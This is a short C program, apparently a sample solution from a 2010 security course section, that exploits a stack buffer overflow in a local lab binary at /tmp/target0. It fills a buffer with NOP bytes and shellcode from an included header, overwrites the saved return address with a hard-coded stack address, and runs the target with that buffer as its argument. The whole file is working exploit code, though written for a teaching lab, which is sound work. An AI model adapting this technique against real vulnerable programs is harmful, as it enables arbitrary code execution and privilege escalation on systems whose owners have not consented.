/*
 * Sample solution given in Section 01/14/2010
 *  - Alexei Czeskis
 *
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];
  char attackBuffer[265]; // 260 + 4 for address + 1 for terminate

  memset(attackBuffer, 0x90, 264);  // Fill with NOPs
  memcpy(attackBuffer, shellcode, strlen(shellcode));  // Copy the payload in


  attackBuffer[264] = 0; // null terminate

  *(unsigned int*)(attackBuffer + 260) = 0xbffffc78; // point to beginning of buffer

  args[0] = TARGET; args[1] = attackBuffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
